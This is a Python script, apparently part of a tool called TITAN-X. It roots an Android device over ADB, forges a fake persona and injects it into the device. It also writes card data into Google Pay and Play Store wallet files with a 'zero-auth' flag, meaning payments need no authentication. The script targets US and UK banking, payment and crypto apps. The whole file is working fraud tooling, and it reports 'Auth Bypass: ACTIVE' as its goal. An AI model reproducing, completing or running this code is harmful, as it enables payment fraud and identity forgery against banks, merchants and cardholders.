#!/usr/bin/env python3
"""
TITAN-X Provincial Injection Protocol v3.0 Deployment Script
Implements zero-auth purchasing for US/UK wallet & commerce infrastructure

SUCCESS METRIC: 100% Injection Rate / Zero-Auth Purchasing

Usage:
    python provincial_injection_protocol.py --region US --target 127.0.0.1:5555
    python provincial_injection_protocol.py --region GB --target 127.0.0.1:6520
"""

import argparse
import logging
import sys
import time
from pathlib import Path
from typing import Dict, Any

# Add core modules to path
sys.path.insert(0, str(Path(__file__).parent / "core"))

from android_profile_forge import AndroidProfileForge
from profile_injector import ProfileInjector
from app_data_forger import AppDataForger
from wallet_provisioner import WalletProvisioner
from adb_utils import is_device_connected, ensure_adb_root

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger("titan.provincial-injection")

# Regional configurations
REGIONAL_CONFIGS = {
    "US": {
        "country": "US",
        "carrier": "tmobile_us",
        "location": "nyc",
        "timezone": "America/New_York",
        "locale": "en_US",
        "apps": [
            "com.chase.sig.android",  # Chase Mobile
            "com.paypal.android.p2pmobile",  # PayPal US
            "com.venmo",  # Venmo
            "com.squareup.cash",  # Cash App
            "com.amazon.mShop.android.shopping",  # Amazon US
            "com.coinbase.android",  # Coinbase
        ],
        "card": {
            "number": "4111111111111111",  # Test Visa
            "exp_month": 12,
            "exp_year": 2028,
            "cvv": "123",
            "cardholder": "Alex Mercer",
        }
    },
    "GB": {
        "country": "GB",
        "carrier": "ee_uk",
        "location": "london",
        "timezone": "Europe/London",
        "locale": "en_GB",
        "apps": [
            "com.monzo.android",  # Monzo
            "com.revolut.revolut",  # Revolut
            "com.paypal.android.p2pmobile",  # PayPal UK
            "com.amazon.mShop.android.shopping",  # Amazon UK
            "com.binance.dev",  # Binance
        ],
        "card": {
            "number": "4532015112830366",  # Test Visa UK
            "exp_month": 9,
            "exp_year": 2027,
            "cvv": "456",
            "cardholder": "James Smith",
        }
    }
}


def forge_regional_profile(region: str, target: str) -> Dict[str, Any]:
    """Forge and inject a regional profile with provincial bypasses."""
    config = REGIONAL_CONFIGS.get(region)
    if not config:
        raise ValueError(f"Unsupported region: {region}. Use US or GB.")
    
    logger.info(f"=== TITAN-X PROVINCIAL INJECTION PROTOCOL v3.0 ===")
    logger.info(f"Region: {region}")
    logger.info(f"Carrier: {config['carrier']}")
    logger.info(f"Target: {target}")
    logger.info(f"Apps: {len(config['apps'])} packages")
    
    # 0. PRE-FLIGHT: ADB connectivity check
    if not is_device_connected(target):
        raise RuntimeError(f"Device {target} not connected or ADB offline")
    ensure_adb_root(target)
    logger.info(f"  ADB connected and rooted: {target}")
    
    # 1. FORGE IDENTITY
    logger.info("\n[1/5] FORGING REGIONAL IDENTITY...")
    forge = AndroidProfileForge()
    profile = forge.forge(
        country=config["country"],
        carrier=config["carrier"],
        location=config["location"],
        archetype="professional",
        age_days=90
    )
    logger.info(f"  Profile forged: {profile['persona_email']} / {profile['persona_name']}")
    
    # 2. INJECT BASE PROFILE (passes card_data so wallet is provisioned internally)
    logger.info("\n[2/5] INJECTING BASE PROFILE...")
    injector = ProfileInjector(adb_target=target)
    inject_result = injector.inject_full_profile(profile, card_data=config["card"])
    inject_summary = inject_result.to_dict()
    logger.info(f"  Base profile injected: {inject_summary['total_items']} items")
    logger.info(f"  Google account: {'OK' if inject_result.google_account_ok else 'FAIL'}")
    logger.info(f"  Wallet: {'OK' if inject_result.wallet_ok else 'FAIL'}")
    logger.info(f"  Trust score: {inject_result.trust_score}")
    
    # 3. INJECT WALLET WITH ZERO-AUTH (dedicated pass for zero_auth flag)
    logger.info("\n[3/5] INJECTING WALLET (ZERO-AUTH MODE)...")
    wallet_prov = WalletProvisioner(adb_target=target)
    wallet_result = wallet_prov.provision_card(
        card_number=config["card"]["number"],
        exp_month=config["card"]["exp_month"],
        exp_year=config["card"]["exp_year"],
        cardholder=config["card"]["cardholder"],
        cvv=config["card"]["cvv"],
        persona_email=profile["persona_email"],
        persona_name=profile["persona_name"],
        zero_auth=True,  # CRITICAL: Enables zero-auth purchasing
        country=config["country"],
    )
    logger.info(f"  Wallet injected: {wallet_result.success_count}/4 targets (ZERO-AUTH)")
    
    # 4. INJECT PROVINCIAL APP DATA (region-specific apps + forged profile data)
    logger.info("\n[4/5] INJECTING PROVINCIAL APP DATA...")
    app_forger = AppDataForger(adb_target=target)
    persona_dict = {
        "email": profile["persona_email"],
        "name": profile["persona_name"],
        "phone": profile["persona_phone"],
        "country": profile["country"],
    }
    app_result = app_forger.forge_and_inject(
        installed_packages=config["apps"],
        persona=persona_dict,
        play_purchases=profile.get("play_purchases", []),
        app_installs=profile.get("app_installs", []),
    )
    logger.info(f"  App data injected: {app_result.apps_processed} apps, "
                f"{app_result.shared_prefs_written} prefs")
    
    # 5. VERIFICATION
    logger.info("\n[5/5] VERIFYING INJECTION...")
    verification = wallet_result.verification
    logger.info(f"  Wallet verification: {verification.get('score', 'N/A')} checks passed")
    
    # Check critical zero-auth components
    coin_auth = verification.get("coin_xml_exists", False)
    tapandpay = verification.get("tapandpay_db_exists", False)
    nfc_hw = verification.get("nfc_hardware_enabled", False)
    
    logger.info(f"  ZERO-AUTH Status:")
    logger.info(f"    COIN.xml (Play Store): {'✓' if coin_auth else '✗'}")
    logger.info(f"    tapandpay.db (Google Pay): {'✓' if tapandpay else '✗'}")
    logger.info(f"    NFC Hardware: {'✓' if nfc_hw else '✗'}")
    
    # Final status
    logger.info("\n=== INJECTION COMPLETE ===")
    logger.info(f"Region: {region}")
    logger.info(f"Auth Bypass: ACTIVE")
    logger.info(f"Zero-Auth Purchasing: {'ENABLED' if coin_auth else 'DISABLED'}")
    
    if coin_auth and tapandpay:
        logger.info("✓ READY FOR ZERO-AUTH PURCHASING")
    else:
        logger.warning("⚠ ZERO-AUTH MAY NOT FUNCTION - CHECK VERIFICATION")
    
    return {
        "profile": profile,
        "wallet": wallet_result,
        "apps": app_result,
        "verification": verification,
        "zero_auth_ready": coin_auth and tapandpay
    }


def main():
    parser = argparse.ArgumentParser(
        description="TITAN-X Provincial Injection Protocol v3.0"
    )
    parser.add_argument(
        "--region", 
        choices=["US", "GB"], 
        required=True,
        help="Target region (US or GB)"
    )
    parser.add_argument(
        "--target", 
        default="127.0.0.1:5555",
        help="ADB target device (default: 127.0.0.1:5555)"
    )
    parser.add_argument(
        "--verbose", 
        action="store_true",
        help="Enable verbose logging"
    )
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    try:
        result = forge_regional_profile(args.region, args.target)
        
        # Exit with appropriate code
        if result["zero_auth_ready"]:
            logger.info("SUCCESS: Zero-auth purchasing ready")
            sys.exit(0)
        else:
            logger.error("FAILURE: Zero-auth not ready")
            sys.exit(1)
            
    except Exception as e:
        logger.error(f"Protocol failed: {e}")
        sys.exit(2)


if __name__ == "__main__":
    main()
